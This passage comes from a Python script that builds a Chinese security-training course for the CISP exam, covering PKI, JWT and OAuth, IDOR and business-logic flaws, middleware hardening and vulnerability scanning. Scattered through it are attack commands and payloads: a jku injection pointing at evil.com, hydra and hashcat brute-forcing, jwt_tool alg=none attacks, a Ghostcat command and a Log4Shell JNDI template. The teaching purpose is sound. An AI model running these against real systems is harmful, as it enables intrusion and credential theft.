| **SAN/MDC** | / | 多域名证书 | 中 |

### Let's Encrypt

```bash
# 免费 DV 证书自动签发
sudo apt install certbot
sudo certbot certonly --webroot -w /var/www/html -d example.com

# 自动续期
sudo certbot renew --dry-run
```"""),
        S('四、证书吊销机制', '四证书吊销机制', r"""## 四、证书吊销机制

| 机制 | 全称 | 原理 | 优缺点 |
|:---|:---|:---|:---|
| **CRL** | Certificate Revocation List | CA 定期发布吊销证书列表 | 有延迟，列表可能很大 |
| **OCSP** | Online Certificate Status Protocol | 实时查询证书状态 | 实时但暴露浏览隐私 |
| **OCSP Stapling** | OCSP 装订 | 服务器代查询并缓存结果 | 高性能且保护隐私 |

```bash
# 查看证书的 CRL 分发点
openssl x509 -in cert.pem -noout -text | grep -A2 CRL

# 手动下载 CRL
wget http://crl.digicert.com/xxx.crl
openssl crl -in xxx.crl -text -noout
```"""),
        S('五、PKI 在 TLS 中的应用', '五pki-在-tls-中的应用', r"""## 五、PKI 在 TLS 中的应用

### TLS 1.3 握手（完整版）

```
客户端                              服务器
  │── ClientHello ───────────────────→│
  │   支持的密码套件, random_C         │
  │   key_share (ECDHE 公钥)          │
  │                                   │
  │←── ServerHello ──────────────────│
  │   选定密码套件, random_S           │
  │   key_share (ECDHE 公钥)          │
  │←── EncryptedExtensions ─────────│
  │←── Certificate ─────────────────│  ← PKI! 服务器证书 + 证书链
  │←── CertificateVerify ───────────│  ← 用证书私钥签名(证明持有私钥)
  │←── Finished ────────────────────│
  │                                   │
  │── Finished ─────────────────────→│  (此时客户端已获取服务器公钥)
  │←────── 加密应用数据 ────────────→│
```

客户端验证证书的过程：
1. 验证证书链到信任的 Root CA
2. 验证证书有效期
3. 验证证书吊销状态（OCSP/CRL）
4. 验证证书域名（SAN/CN）与访问域名匹配
5. CertificateVerify 签名 —— 证明服务器持有证书对应的私钥"""),
        S('六、PKI 安全威胁', '六pki-安全威胁', r"""## 六、PKI 安全威胁

| 威胁 | 描述 | 真实案例 |
|:---|:---|:---|
| **CA 被攻破** | CA 私钥泄露→任意签发证书 | DigiNotar (2011), Comodo (2011) |
| **中间人攻击** | 伪造证书进行 TLS 拦截 | 企业透明代理, Superfish (Lenovo, 2015) |
| **证书透明度绕过** | 绕过 CT 日志记录 | 部分 CA 未正确记录 |
| **域名验证绕过** | 骗取 DV 证书 | Let's Encrypt 自动化签发被恶意利用 |
| **私钥泄露** | Heartbleed (CVE-2014-0160) | OpenSSL 内存泄露→私钥泄露 |
| **算法降级** | 降级到弱签名算法 | SHA-1 碰撞, FREAK/Logjam 攻击 |

```bash
# 检测 Heartbleed 漏洞
nmap -sV --script ssl-heartbleed -p 443 target

# 检测弱 TLS 配置
nmap --script ssl-enum-ciphers -p 443 target
sslscan target.com:443
testssl.sh https://target.com
```"""),
    ],
    [
        ('PKI 组成', '⭐⭐⭐⭐⭐', '低', 'CA+RA+证书库+密钥恢复+证书吊销(CRL/OCSP)'),
        ('X.509 证书字段', '⭐⭐⭐⭐⭐', '中', '版本/序列号/签名算法/颁发者/有效期/主体/公钥/扩展/签名'),
        ('证书链验证', '⭐⭐⭐⭐⭐', '高', '逐级验证签名→检查有效期→检查吊销→最终信任Root CA'),
        ('CRL vs OCSP', '⭐⭐⭐⭐', '中', 'CRL定期发布有延迟；OCSP实时查询暴露隐私；OCSP Stapling兼顾'),
        ('TLS握手PKI角色', '⭐⭐⭐⭐⭐', '高', 'Certificate消息发送证书链；CertificateVerify证明持有私钥'),
        ('Heartbleed', '⭐⭐⭐⭐⭐', '中', 'CVE-2014-0160, OpenSSL心跳包读越界→泄露内存(含私钥)'),
        ('证书透明度 CT', '⭐⭐⭐', '中', '所有公开证书应记录在CT日志中；监控CT可发现恶意证书'),
    ],
    [
        ('证书链验证', '"根信-中间签-末端用——逐级验证无例外"', 'Root CA在系统信任库→Intermediate被Root签→End被Intermediate签→逐级验证签名'),
        ('TLS证书三验证', '"三个Check：签名-时间-域名"', '签名验证(证书链)→有效期检查→域名匹配(SAN/CN)',
         '缺少任何一个验证都会导致安全风险'),
    ],
    [
        ('PKI = 证书加密', 'PKI 是管理体系而非加密算法本身。它包括 CA、RA、证书库、CRL/OCSP、密钥恢复等完整生态。'),
        ('自签名证书就是安全的', '自签名证书无法验证身份（没有可信 CA 背书），仅适用于测试环境。攻击者可伪造自签名证书实施 MITM。'),
        ('OCSP 一定比 CRL 好', 'OCSP 实时但暴露用户浏览隐私（CA 知道你在访问哪个网站）。OCSP Stapling 是更好的方案。'),
    ],
    [
        '用 openssl 手动验证一个 HTTPS 网站的证书链：从叶证书逐级验证到根证书。',
        '搭建本地 CA：用 openssl 生成 Root CA → 签发 Intermediate → 签发服务端证书。',
        '安装 testssl.sh 扫描一个网站的 TLS 配置，分析每个发现的弱点。',
        "了解 Let's Encrypt 的 ACME 协议自动化验证流程。",
    ],
    'PKI 是整个互联网信任的基石——当你看到浏览器地址栏的那把"小锁"，背后是 CA 体系、证书链验证、OCSP/CRL 吊销检查的复杂协作。第十二天，你知道了那把"小锁"背后的全部故事。',
)

print(f"  [BASIC] Day 12 done, total lines so far: {total_lines}")
sys.stdout.flush()

# Day 13: 身份认证与授权
make_day('basic', 13, '身份认证与授权', '中级', '35',
    '身份认证（你是谁）与授权（你能做什么）是安全架构的核心支柱。本章详解多因素认证（MFA）、OAuth 2.0/OpenID Connect 协议、JWT Token 安全、Session 管理和常见认证漏洞（暴力破解、凭证填充、会话固定），涵盖 CISP 高频考点。',
    [
        S('一、认证 vs 授权', '一认证-vs-授权', r"""## 一、认证 vs 授权

| 维度 | 认证 (Authentication) | 授权 (Authorization) |
|:---|:---|:---|
| 问题 | **你是谁？** | **你能做什么？** |
| 时机 | 先认证，后授权 | 认证通过后进行 |
| 方式 | 密码/生物特征/Token/MFA | RBAC/ABAC/ACL |
| 示例 | 登录系统 | 访问管理页面 |

> **🔑 高分考点**：Authentication ≠ Authorization——认证失败返回 401 Unauthorized（实际是"未认证"），授权失败返回 403 Forbidden。

### 认证三因素

| 因素类型 | 描述 | 示例 |
|:---|:---|:---|
| **知识** | 你知道什么 | 密码、PIN、安全问题 |
| **持有** | 你拥有什么 | 手机(TOTP)、U盾、智能卡 |
| **固有** | 你是什么 | 指纹、面部、虹膜、声纹 |

> MFA = 同时使用 ≥2 种因素。密码+短信 = 双因素（知识+持有）。"""),
        S('二、OAuth 2.0 协议', '二oauth-20-协议', r"""## 二、OAuth 2.0 协议

OAuth 2.0 是**授权**协议（非认证协议！），允许第三方应用获取有限的资源访问权限：

```
Authorization Code 流程（最安全的授权码模式）:

用户 ──→ 第三方应用 ──→ 授权服务器 ──→ 用户确认授权
                                   └──→ 返回 Authorization Code
第三方应用 ←── 用 Code 换 Access Token ──→ 授权服务器
第三方应用 ←── 用 Access Token 访问资源 ──→ 资源服务器
```

| 授权模式 | 适用场景 | 安全级别 |
|:---|:---|:---:|
| **Authorization Code + PKCE** | Web App / 移动 App | ⭐⭐⭐⭐⭐ |
| **Authorization Code** | Web App（有后端） | ⭐⭐⭐⭐ |
| **Implicit** | SPA（已废弃） | ⭐⭐ |
| **Client Credentials** | 服务间通信 | ⭐⭐⭐⭐ |
| **Resource Owner Password** | 高信任应用（避免使用） | ⭐ |

### OpenID Connect (OIDC)

OIDC 在 OAuth 2.0 基础上增加**身份认证**层，是"OAuth 2.0 用于认证"的标准：

```
OAuth 2.0 → 授权 → Access Token（访问资源）
OIDC      → 认证 + 授权 → ID Token + Access Token
                           │            │
                    身份信息(JWT)    访问资源
```"""),
        S('三、JWT Token 安全', '三jwt-token-安全', r"""## 三、JWT Token 安全

### JWT 结构

```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature-base64
└────── 头部 ──────┘ └───── 载荷 ─────┘ └──── 签名 ────┘
     Header            Payload           Signature
     Base64(          Base64(           HMAC-SHA256(
     {"alg":"HS256",  {"user":"admin",   header + "." + payload,
      "typ":"JWT"}     "exp":123456})     secret_key))
```

### JWT 常见安全漏洞

| 漏洞 | 描述 | 利用方式 |
|:---|:---|:---|
| **alg=none** | 接受无签名的 JWT | 修改 Header: {"alg":"none"} |
| **HMAC/RSA 混淆** | 用公钥作为 HMAC secret | 服务器用RSA公钥验证但接受HMAC→用公钥签名 |
| **弱密钥爆破** | Secret 太短可暴力破解 | hashcat -m 16500 jwt.txt wordlist.txt |
| **kid 注入** | 操控 Key ID 读取文件 | kid: \`/etc/passwd\` → 路径遍历 |
| **jku 注入** | 操控 JWK Set URL | jku: http://evil.com/jwks.json |

```bash
# jwt_tool 安全测试
python3 jwt_tool.py <token> -T  # 篡改测试
python3 jwt_tool.py <token> -X a  # alg=none 攻击

# 暴力破解 JWT secret
hashcat -m 16500 -a 0 jwt.txt rockyou.txt
```"""),
        S('四、常见认证漏洞', '四常见认证漏洞', r"""## 四、常见认证漏洞

| 漏洞 | 描述 | 防御 |
|:---|:---|:---|
| **暴力破解** | 反复尝试密码 | 账户锁定、速率限制、CAPTCHA |
| **凭证填充** | 使用泄露的密码库尝试 | MFA、异常登录检测 |
| **会话固定** | 诱导用户使用预设 Session ID | 登录后重新生成 Session |
| **Session 超时** | 长时间未活动仍有效 | 设置合理超时时间 |
| **Cookie 安全** | Cookie 未设安全标志 | HttpOnly + Secure + SameSite |
| **密码重置投毒** | 操纵 Host/Header 劫持重置链接 | 使用绝对URL、验证Host头 |

```bash
# 暴力破解检测
hydra -l admin -P passwords.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# Burp Intruder Cluster Bomb 模式
# 对多参数进行暴力破解组合
```"""),
    ],
    [
        ('认证 vs 授权', '⭐⭐⭐⭐⭐', '低', '认证=你是谁(401)；授权=能做什么(403)'),
        ('MFA 三因素', '⭐⭐⭐⭐⭐', '低', '知识(密码)+持有(手机)+固有(指纹)；≥2因素=MFA'),
        ('OAuth 2.0 模式', '⭐⭐⭐⭐⭐', '中', 'Authorization Code+PKCE最安全；Implicit已废弃'),
        ('JWT 安全', '⭐⭐⭐⭐⭐', '高', 'alg=none绕过/JWK注入/弱密钥爆破；验证库必须白名单alg'),
        ('Session 固定攻击', '⭐⭐⭐⭐', '中', '登录后立即regenerate session ID是最簡单防御'),
        ('OAuth != 认证', '⭐⭐⭐⭐', '中', 'OAuth 2.0是授权协议；OIDC(OpenID Connect)是认证层'),
    ],
    [
        ('认证三因素', '"知-持-固：我知道密码、我持有手机、我是指纹"', '知识因素=你知道的；持有因素=你拥有的；固有因素=你本身的特征',
         '双因素必须来自不同类别——密码+安全问题仍是单因素（都是知识）'),
        ('OAuth 记忆', '"O-Auth——授权非认证"', 'OAuth 2.0管授权(access resources)、OIDC才管认证(who you are)',
         '考试中经常混用这两个概念，一定要区分清楚'),
    ],
    [
        ('OAuth 2.0 是认证协议', 'OAuth 2.0 是授权协议。当你需要认证时，应使用 OIDC (OpenID Connect)，它在 OAuth 2.0 之上增加了身份信息。'),
        ('JWT 已签名所以安全', '签名保证完整性，但无法阻止 alg=none 绕过或 JWK 注入。必须使用标准库并白名单允许的算法。'),
        ('加了 MFA 就绝对安全', 'MFA 可被社会工程学绕过（如诱骗用户批准推送通知）。MFA 大幅提升安全性但不能替代其他安全措施。'),
    ],
    [
        '使用 jwt.io 在线解析 JWT 结构，理解 Header/Payload/Signature 各部分的作用。',
        '搭建 OAuth 2.0 + OIDC 环境（如 Keycloak），实践 Authorization Code + PKCE 流程。',
        '在靶场环境中测试 JWT 攻击：alg=none、弱密钥、kid 注入等。',
        '阅读 RFC 6749 (OAuth 2.0) 和 RFC 7519 (JWT) 官方规范。',
    ],
    '认证与授权是安全的"门和锁"——门判断你是谁，锁决定你能去哪。OAuth 2.0 和 JWT 已经成为现代应用认证的标配，理解它们的安全风险是每个安全工程师的必修课。第十三天，你知道了如何"把门锁好"。',
)

print(f"  [BASIC] Day 13 done, total lines so far: {total_lines}")
sys.stdout.flush()

# Day 14: 越权与业务逻辑漏洞
make_day('basic', 14, '越权与业务逻辑漏洞', '中级', '35',
    '越权漏洞（IDOR）和业务逻辑漏洞因无法被自动化扫描器发现而被称为"漏洞之王"——它们隐藏在业务代码的逻辑链条中。本章详解水平越权（同角色访问他人数据）、垂直越权（低权限执行高权限操作）、以及支付篡改、优惠券滥用等业务逻辑漏洞，大量真实案例。',
    [
        S('一、越权漏洞分类', '一越权漏洞分类', r"""## 一、越权漏洞分类

| 类型 | 描述 | 示例 |
|:---|:---|:---|
| **水平越权** | 同权限用户访问他人数据 | 用户A修改参数看到用户B的订单 |
| **垂直越权** | 低权限执行高权限操作 | 普通用户执行管理员API |
| **上下文越权** | 在不同上下文中的权限混乱 | 组织A的成员访问组织B的数据 |

```
水平越权: 用户A ──修改id参数──→ 访问用户B的数据
垂直越权: 普通用户 ──调用管理API──→ 删除系统用户
```

> **🔑 高分考点**：越权漏洞的本质——**服务器端未验证"请求者是否有权操作目标资源"**。前端隐藏按钮不等于安全控制！"""),
        S('二、水平越权 IDOR', '二水平越权-idor', r"""## 二、水平越权 (IDOR)

IDOR（Insecure Direct Object Reference）是最常见的越权类型：

```http
# 用户A访问自己的订单
GET /api/order/1234 HTTP/1.1
Cookie: session=userA

# 修改订单ID → 看到用户B的订单
GET /api/order/1235 HTTP/1.1
Cookie: session=userA
→ 返回用户B的订单详情！（水平越权）

# 其他常见IDOR场景
GET /api/users/42/profile     → 修改42为其他用户ID
POST /api/files/delete  {"file_id": 99}  → 删除他人文件
GET /download?file=user_x_report.pdf    → 修改file参数
```

### IDOR 检测技巧

```bash
# 创建两个账号 → 用A的Cookie访问B的资源
# 工具化检测：Burp Autorize 插件 / AuthMatrix
# 关注：数字ID、UUID、用户名、邮箱等资源标识符

# 利用 Burp Intruder 枚举
# 参数: user_id=§100§ → Payload: Numbers 100-200
```"""),
        S('三、垂直越权', '三垂直越权', r"""## 三、垂直越权

```http
# 普通用户尝试访问管理员功能
GET /admin/users HTTP/1.1
Cookie: session=regular_user
→ 居然返回了所有用户列表！（垂直越权）

# 普通用户调用管理员API
POST /api/admin/deleteUser HTTP/1.1
Cookie: session=regular_user
{"user_id": 123}
→ 居然成功删除！（垂直越权）

# 未登录访问受保护资源
GET /api/export/customer_data.csv
→ 无需任何认证即可下载！（未认证访问）
```

### 常见越权点

| 功能 | 越权风险 | 检测方法 |
|:---|:---|:---|
| 订单查询 | 水平越权看他人订单 | 修改 order_id |
| 文件下载 | 路径遍历+水平越权 | 修改 file/download 参数 |
| 用户管理 | 垂直越权删/改用户 | 低权限调用管理API |
| API 接口 | 未授权访问 | 遍历 API 路径 |
| 报表导出 | 越权导出敏感数据 | 修改 export 参数 |"""),
        S('四、业务逻辑漏洞', '四业务逻辑漏洞', r"""## 四、业务逻辑漏洞

### 常见业务逻辑漏洞

| 漏洞类型 | 描述 | 示例 |
|:---|:---|:---|
| **支付篡改** | 修改价格/数量/币种 | 商品 ¥100 → 修改参数 price=1 |
| **优惠券滥用** | 重复使用/叠加/负值 | 多次使用同一优惠码 |
| **负数攻击** | 提交负数数量 | 购买 -1 件=退款+商品 |
| **并发竞争** | 同一操作并发多次 | 抢红包/秒杀超发 |
| **流程绕过** | 跳过某些必须步骤 | 直接访问支付成功回调URL |
| **0元购** | 价格参数可篡改为0 | 修改 total_price=0 |
| **整数溢出** | 超大数据导致计算错误 | 购买极大数量价格溢出为负 |

```bash
# 支付篡改测试
POST /api/pay
{"order_id": 123, "amount": 9999.00}  → 修改 amount 为 0.01

# 优惠券负数测试
POST /api/apply_coupon
{"code": "SAVE50", "discount": -50}  → 变为加钱！

# 并发测试（Burp Intruder）
# 同一请求发送50次，观察是否创建了50个优惠/订单

# 流程绕过测试
# 直接访问 /payment/success?order_id=123（跳过支付步骤）
```"""),
        S('五、防御实践', '五防御实践', r"""## 五、防御实践

```text
越权防御核心原则：永远不信任客户端输入！

1. 资源归属验证（每次访问资源前）
   SELECT * FROM orders WHERE id=? AND user_id=?  ← 同时验证！

2. 权限模型设计
   □ RBAC (基于角色): admin/manager/user
   □ ABAC (基于属性): 部门+级别+时间
   □ 中间件统一鉴权

3. 使用不可预测标识符
   用 UUID 代替自增 ID → /api/order/a1b2c3d4-e5f6

4. 业务逻辑安全
   □ 服务端验证价格（不从客户端接收）
   □ 订单幂等性（防重复提交）
   □ 状态机校验（防止跳过流程步骤）
```

```python
# Flask 权限中间件示例
from functools import wraps

def require_role(role):
    def decorator(f):
        @wraps(f)
        def decorated(*args, **kwargs):
            if session.get('role') != role:
                abort(403)
            return f(*args, **kwargs)
        return decorated
    return decorator

@app.route('/admin/users')
@require_role('admin')
def admin_users():
    return list_all_users()
```"""),
    ],
    [
        ('水平越权 vs 垂直越权', '⭐⭐⭐⭐⭐', '中', '水平=同级别跨用户(A看B数据)；垂直=低权限跨级别(普通做管理操作)'),
        ('IDOR 本质', '⭐⭐⭐⭐⭐', '中', 'Insecure Direct Object Reference——未验证请求者是否有权操作目标资源'),
        ('支付逻辑漏洞', '⭐⭐⭐⭐', '中', '价格/数量/优惠券/币种参数可篡改；必须服务端独立计算金额'),
        ('并发竞争防御', '⭐⭐⭐⭐', '中', '数据库行锁/分布式锁/幂等性Token/Redis计数器'),
        ('防御核心', '⭐⭐⭐⭐⭐', '中', '每次数据访问加WHERE user_id=?；UUID替代自增ID；中间件统一鉴权'),
    ],
    [
        ('越权检测逻辑', '"两账号交叉测，一找IDOR二找垂直"', '注册两个同权限账号→交叉访问对方资源(测水平越权)；普通账号尝试访问管理员功能(测垂直越权)'),
        ('业务逻辑口诀', '"价格不靠传，库存不靠减"', '价格必须在服务端计算(来自数据库而非客户端)；库存操作必须原子性(防并发超卖)',
         '支付类漏洞是SRC(安全应急响应中心)中最常见的"高危"漏洞来源之一'),
    ],
    [
        ('前端隐藏了按钮就没问题', '安全控制必须在服务端实现。攻击者可以直接构造HTTP请求调用任何API，前端UI上的限制形同虚设。'),
        ('使用UUID代替自增ID就防IDOR', 'UUID难以猜测但不等于授权验证。攻击者仍可能通过其他方式获取UUID（如Burp抓包、信息泄露）。'),
        ('业务逻辑漏洞自动化扫描器能发现', '业务逻辑漏洞需要理解业务上下文，自动化扫描器几乎无法发现。必须通过手工渗透测试或代码审计。'),
    ],
    [
        '在 PortSwigger 的 Access Control 实验靶场中练习发现和利用各种越权漏洞。',
        '使用 Burp Autorize 插件自动化越权测试——它会自动用低权限 Cookie 重放高权限请求。',
        '阅读 OWASP API Security Top 10——API1: Broken Object Level Authorization 排名第一。',
        '在自家应用中审计：每个 API 端点是否验证了"当前用户是否有权操作目标资源"。',
    ],
    '越权漏洞是安全测试的"试金石"——它测试的不是代码有没有漏洞，而是开发者的"安全意识"。每一次对用户输入的信任、每一个被遗忘的权限检查，都可能成为数据泄露的源头。第十四天，从此你写的每一个API都会先问："这个用户有权做这件事吗？"',
)

print(f"  [BASIC] Day 14 done, total lines so far: {total_lines}")
sys.stdout.flush()

# Day 15: 中间件安全配置
make_day('basic', 15, '中间件安全配置', '中级', '35',
    '中间件（Nginx/Apache/Tomcat/IIS）是 Web 应用的第一道防线，配置不当直接导致服务器沦陷。本章系统讲解常见中间件的安全加固基线、解析漏洞（如 IIS 6.0 PUT、Nginx 路径解析）、目录遍历、默认配置风险和实战加固方案。',
    [
        S('一、Nginx 安全配置', '一nginx-安全配置', r"""## 一、Nginx 安全配置

### 基础安全配置

```nginx
server {
    listen 443 ssl http2;
    server_name example.com;

    # 隐藏版本号
    server_tokens off;

    # 限制请求方法
    if ($request_method !~ ^(GET|HEAD|POST)$) {
        return 405;
    }

    # 限制请求速率
    limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
    location /api/ {
        limit_req zone=api burst=20 nodelay;
    }

    # 禁止访问敏感文件
    location ~* \.(git|svn|hg|env|sql|bak|log|yml|yaml|ini|conf)$ {
        deny all;
        return 404;
    }

    # 禁止访问隐藏文件
    location ~ /\. {
        deny all;
        return 404;
    }

    # 防止目录遍历
    autoindex off;
}
```

### Nginx 解析漏洞

```nginx
# 漏洞配置：
location ~ \.php$ {
    fastcgi_pass 127.0.0.1:9000;
}
# 访问 /upload/evil.jpg/test.php → 匹配 \.php$ → 交给 PHP 解析！
# 修复：使用 ^~ 精确匹配或完整的 try_files 判断

# 安全配置：
location ~ \.php$ {
    try_files $uri =404;  # 文件不存在直接404，不交给PHP
    fastcgi_pass 127.0.0.1:9000;
}
```"""),
        S('二、Apache 安全配置', '二apache-安全配置', r"""## 二、Apache 安全配置

```apache
# 隐藏版本信息
ServerTokens Prod
ServerSignature Off

# 禁用目录列表
Options -Indexes

# 禁用 TRACE/TRACK 方法
TraceEnable off

# 限制文件上传大小
LimitRequestBody 10485760

# 禁止访问 .htaccess
<Files ".ht*">
    Require all denied
</Files>

# 安全头
Header always set X-Content-Type-Options "nosniff"
Header always set X-Frame-Options "DENY"
```

### Apache 多后缀解析漏洞

```
# Apache 从右向左识别扩展名，遇到不认识的则继续向左
# file.php.xxx → 不认识 xxx → 解析为 .php → 执行 PHP！
# file.php.jpg → Apache可能不认识 jpg → 解析为 PHP
# 修复：禁用不需要的 MIME 类型或配置文件扩展名白名单
```"""),
        S('三、Tomcat 安全', '三tomcat-安全', r"""## 三、Tomcat 安全配置

```xml
<!-- server.xml 安全配置 -->
<Connector port="8080" 
    server=" "                          <!-- 隐藏版本 -->
    maxPostSize="10485760"             <!-- 限制 POST 大小 -->
    connectionTimeout="20000" />

<!-- 禁用默认应用 -->
<!-- 删除 webapps/ 下的默认应用：ROOT, manager, host-manager, docs, examples -->

<!-- 禁用 PUT/DELETE（DefaultServlet） -->
<init-param>
    <param-name>readonly</param-name>
    <param-value>true</param-value>
</init-param>
```

### Tomcat 漏洞回顾

| 漏洞 | CVE | 影响 |
|:---|:---|:---|
| **Ghostcat（文件包含）** | CVE-2020-1938 | AJP协议文件读取→RCE |
| **War 文件上传** | 弱密码 | 通过 manager 上传 war 包获取 shell |
| **PUT 任意文件上传** | CVE-2017-12615 | 默认允许 PUT 方法创建 JSP |

```bash
# CVE-2020-1938 Ghostcat 检测
python3 ghostcat.py -f /WEB-INF/web.xml target.com

# Tomcat Manager 弱密码爆破
hydra -l tomcat -P passwords.txt target http-get /manager/html
```"""),
        S('四、IIS 安全', '四iis-安全', r"""## 四、IIS 安全配置

### IIS 解析漏洞

```
IIS 6.0:
  /test.asp;.jpg  → 解析为 ASP（分号截断）
  /test.asp/test.jpg → 解析为 ASP（路径解析）
  修复：升级到 IIS 7+

IIS 7.0/7.5（FastCGI）:
  /test.jpg/.php → 解析为 PHP（路径解析+PHP配置不当）
  修复：配置 cgi.fix_pathinfo=0
```

### IIS 加固基线

```powershell
# 移除不必要的 IIS 模块
Remove-WindowsFeature Web-DAV-Publishing
Remove-WindowsFeature Web-Ftp-Server

# 禁用目录浏览
Set-WebConfigurationProperty -Filter system.webServer/directoryBrowse -Name enabled -Value False

# 设置请求限制
Set-WebConfigurationProperty -Filter system.webServer/security/requestFiltering `
    -Name requestLimits.maxAllowedContentLength -Value 10485760
```"""),
        S('五、通用中间件加固', '五通用中间件加固', r"""## 五、通用中间件加固清单

```text
□ 最小权限原则
  └─ 中间件进程不以 root/admin 运行
  └─ 使用专用低权限账户

□ 安全头配置
  └─ CSP / HSTS / X-Frame-Options / X-Content-Type-Options

□ TLS 配置
  └─ TLS 1.2+ / 禁用弱密码套件 / 定期更新证书

□ 日志与监控
  └─ 开启访问日志和错误日志
  └─ 日志发送到 SIEM 集中分析
  └─ 监控异常请求模式

□ 版本管理
  └─ 定期更新到最新稳定版
  └─ 关注 CVE 公告

□ 默认配置清理
  └─ 删除默认页面/示例/管理后台
  └─ 修改默认管理员密码
  └─ 禁用不需要的模块/方法

□ 目录权限
  └─ 上传目录: 无执行权限
  └─ 配置文件: 只读
  └─ Web 根目录: 最小权限
```"""),
    ],
    [
        ('Nginx 解析漏洞', '⭐⭐⭐⭐', '中', '\.php$匹配路径任意位置→/upload/evil.jpg/.php被解析'),
        ('Apache 多后缀解析', '⭐⭐⭐⭐', '中', '从右向左识别扩展名→不认识则向左继续→file.php.xxx被解析'),
        ('Tomcat Ghostcat', '⭐⭐⭐⭐⭐', '高', 'CVE-2020-1938：AJP连接器文件读取→泄露WEB-INF→RCE'),
        ('IIS 6.0 分号截断', '⭐⭐⭐⭐', '中', 'test.asp;.jpg被解析为ASP'),
        ('中间件加固核心', '⭐⭐⭐⭐⭐', '中', '最小权限+隐藏版本+安全头+日志+定期更新+默认配置清理'),
    ],
    [
        ('中间件安全口诀', '"Ngin解-Tom猫-IIS截——三大件各有漏洞坑"', 'Nginx路径解析匹配、Tomcat War包上传和AJP、IIS分号截断',
         '每年都有新的中间件CVE，保持更新是最简单也最重要的防御措施'),
    ],
    [
        ('修改了配置文件就安全了', '配置安全是基础但并非万能——代码层面的漏洞（如上传漏洞）可绕过中间件限制。'),
        ('隐藏版本号就没人知道我用什么中间件', '攻击者可通过行为特征（如特定的错误响应、默认页面）识别中间件类型。隐藏版本号增加难度但不阻止攻击。'),
    ],
    [
        '使用 Nginx/Apache/Tomcat 官方安全加固文档逐项检查你的服务器配置。',
        '在本地搭建存在已知漏洞的中间件版本（如 Tomcat 8.0），复现 Ghostcat 攻击。',
        '使用 Mozilla Observatory（https://observatory.mozilla.org/）检测你网站的 HTTP 安全头配置。',
        '学习 Docker 安全最佳实践——容器化部署是隔离中间件风险的有效手段。',
    ],
    '中间件是 Web 应用的"大门"——门如果不牢，里面的保险柜再坚固也没用。Nginx 一行配置写错，就可能让攻击者突破所有防线。第十五天，你学会了如何把"大门"加固。',
)

print(f"  [BASIC] Day 15 done, total lines so far: {total_lines}")
sys.stdout.flush()

# Day 16: 漏洞扫描与评估
make_day('basic', 16, '漏洞扫描与评估', '中级', '35',
    '漏洞扫描是安全评估的第一步——它能在攻击者发现漏洞之前帮你找到它们。本章从 Nessus/OpenVAS 的企业级扫描讲起，涵盖 Nuclei/ nuclei-templates 社区生态、CVSS 评分体系、漏洞优先级排序和扫描报告撰写，结合 CISP 考试中对漏洞管理的考核要点。',
    [
        S('一、漏洞扫描概述', '一漏洞扫描概述', r"""## 一、漏洞扫描概述

漏洞扫描通过自动化工具识别目标系统中的已知漏洞和配置弱点：

```
漏洞扫描流程:
资产发现 → 端口扫描 → 服务识别 → 漏洞匹配 → 风险评估 → 报告输出
```

| 扫描类型 | 认证方式 | 深度 | 适用场景 |
|:---|:---|:---:|:---|
| **非认证扫描** | 无 | 浅 | 外部攻击面评估、互联网暴露面 |
| **认证扫描** | 提供凭证 | 深 | 内部合规审计、补丁管理 |

> **🔑 高分考点**：认证扫描比非认证扫描更准确——能检测到补丁级别、本地配置缺陷、弱密码等需登录才能发现的问题。误报率也更低。"""),
        S('二、Nessus 漏洞扫描', '二nessus-漏洞扫描', r"""## 二、Nessus 扫描实践

```bash
# Nessus 安装（Kali）
sudo dpkg -i Nessus-*.deb
sudo systemctl start nessusd
# Web UI: https://localhost:8834

# Nessus 命令行扫描
/opt/nessus/sbin/nessuscli scan new "Basic Scan" \
    --target 192.168.1.0/24 \
    --policy "Basic Network Scan"

# 导出报告
/opt/nessus/sbin/nessuscli report export
```

### Nessus 扫描策略选择

| 策略 | 用途 | 速度 |
|:---|:---|:---|
| **Basic Network Scan** | 通用全端口扫描 | 中 |
| **Host Discovery** | 仅存活探测 | 快 |
| **Advanced Scan** | 自定义深度扫描 | 慢 |
| **Web Application Tests** | Web 漏洞专项 | 中 |
| **Credentialed Patch Audit** | 补丁合规检查 | 中 |
| **PCI DSS Quarterly** | PCI DSS 合规 | 慢 |

### 典型发现分类

```text
Critical (严重): MS17-010 永恒之蓝 → 立即修复
High (高危): 弱SSH密码、过时Apache版本 → 24h内修复
Medium (中危): 信息泄露(TLS版本、Server头) → 计划修复
Low (低危): 无安全影响的配置建议 → 酌情处理
Info (信息): 开放端口列表 → 记录在案
```"""),
        S('三、OpenVAS / Greenbone', '三openvas-greenbone', r"""## 三、OpenVAS 开源扫描

```bash
# 安装（Kali）
sudo apt install openvas
sudo gvm-setup    # 首次初始化（下载feed需要时间）

# Web UI: https://localhost:9392
# 默认账号: admin

# 命令行扫描
gvm-cli --gmp-username admin --gmp-password password \
    socket --socketpath /var/run/gvmd.sock \
    --xml "<create_task>...</create_task>"
```

### Nessus vs OpenVAS 对比

| 维度 | Nessus (商业) | OpenVAS (开源) |
|:---|:---|:---|
| 插件数量 | 180,000+ | 80,000+ |
| 更新频率 | 每日 | 每日 |
| 扫描速度 | 快（优化好） | 较慢 |
| 误报率 | 低 | 中等 |
| CISP考点 | CISSP/PCI 合规主流 | 免费替代方案 |"""),
        S('四、Nuclei 模板扫描', '四nuclei-模板扫描', r"""## 四、Nuclei 模板化漏洞扫描

Nuclei 是基于 YAML 模板的高性能漏洞扫描器，社区生态极好：

```bash
# 安装
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# 基础扫描
nuclei -u https://target.com
nuclei -l targets.txt -t cves/ -o results.txt

# 特定模板扫描
nuclei -u https://target.com -t cves/2024/ -severity critical,high

# 组合管道（subfinder → httpx → nuclei）
subfinder -d target.com | httpx | nuclei -t technologies/
```

### Nuclei 模板结构

```yaml
id: CVE-2021-44228
info:
  name: Apache Log4j RCE
  severity: critical
  description: Log4Shell RCE

requests:
  - raw:
      - |
        GET /${jndi:ldap://{{interactsh-url}}} HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
```

```bash
# 针对特定 CVE 扫描
nuclei -l targets.txt -t cves/ -severity critical,high

# 自定义模板
nuclei -u target -t ~/nuclei-templates/custom/
```"""),
        S('五、CVSS 评分体系', '五cvss-评分体系', r"""## 五、CVSS 评分体系

CVSS (Common Vulnerability Scoring System) 是漏洞严重性的标准化评分体系（0-10）：

```
